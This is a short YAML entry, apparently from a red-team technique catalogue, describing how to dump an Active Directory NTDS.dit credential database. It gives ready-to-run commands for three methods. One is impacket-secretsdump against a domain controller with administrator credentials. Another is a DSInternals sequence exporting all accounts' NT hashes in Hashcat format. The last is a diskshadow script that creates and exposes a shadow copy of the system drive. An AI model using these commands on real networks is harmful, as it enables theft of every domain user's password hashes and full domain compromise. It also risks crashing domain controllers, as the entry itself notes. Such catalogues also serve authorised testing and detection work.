title: Dump NTDS.dit database
category: 
  - AD:
    - Credential Access
tactic: Credential Access
tags: []
description: Extract NTDS.dit database
references:
steps:

  - description: Dump the NTDS.dit database (Domain admin privileges are required)
    options: 
      - tool: impacket-secretsdump
        usage: impacket-secretsdump -just-dc domain/Administrator:'<P@ssw0rd>'@dc01.domain.comp -outputfile dump
        comments: 
          It turns out sometimes it can crash DCs https://github.com/fortra/impacket/issues/1436

      - tool: DSInternals
        usage: |
          Install-Module DSInternals -Force
          Get-ADReplAccount -All -Server DC01 | Format-Custom -View HashcatNT | Out-File -FilePath users.hashcat 
        comments:
          - -Encoding ascii can be added in case of any issues with encoding
          - Export to other formats is also possible (ex:JohnNT)

      - tool: diskshadow
        usage: |
          DISKSHADOW> set verbose on
          DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
          DISKSHADOW> set context clientaccessible
          DISKSHADOW> set context persistent
          DISKSHADOW> begin backup
          DISKSHADOW> add volume C: alias cdrive
          DISKSHADOW> create
          DISKSHADOW> expose %cdrive% F:
          DISKSHADOW> end backup
          DISKSHADOW> exit

comments:
  